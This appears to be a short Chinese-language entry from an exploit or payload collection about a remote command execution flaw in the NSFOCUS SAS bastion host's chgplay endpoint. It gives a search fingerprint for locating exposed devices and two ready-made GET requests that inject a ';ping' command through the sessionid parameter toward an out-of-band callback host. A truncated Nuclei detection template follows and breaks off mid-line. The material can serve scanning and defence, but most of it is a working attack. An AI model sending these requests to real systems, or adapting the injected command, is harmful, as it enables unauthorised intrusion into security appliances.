# 绿盟SAS堡垒机chgplay远程命令执行漏洞

- **系统**：绿盟SAS堡垒机chgplay　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="needUsbkey.php?username"`

**请求体 / payload**
```
/webconf/log/chgplay?cat=espc\&sid=7473a85e535405e7bd991cb82b2f134c\&status=charset\&speed=10\&sessionid=%3Bping%20ctokfhmqoankrf2gghjget6hprjcwcjp5.oast.pro%3B
/webconf/log/chgplay?cat=espc\&sid=7473a85e535405e7bd991cb82b2f134c\&status=charset\&speed=10\&sessionid=;ping dnslog.com;
```
- **预期**：200　|　—

**其他**
- Nuclei: | id: nsfocus-sas-chgplay-rce<br/><br/>info:<br/>  name: 绿盟 SAS堡垒机 chgplay 远程命令执行漏洞<br/>  author: AS<br/>  severity: critical<br/>  metadata:<br/>    max-request: 3<br/>    fofa-query: body="needUsbkey.php?username"<br/>    verified: true<br/>  tags: nsfocus, iot, rce<br/><br/>http:<br/>  - method: GET<br/>    path:<br/>      - "{{BaseURL}}/webconf/log/chgplay?cat=espc\&sid=7473a85e535405e7bd991cb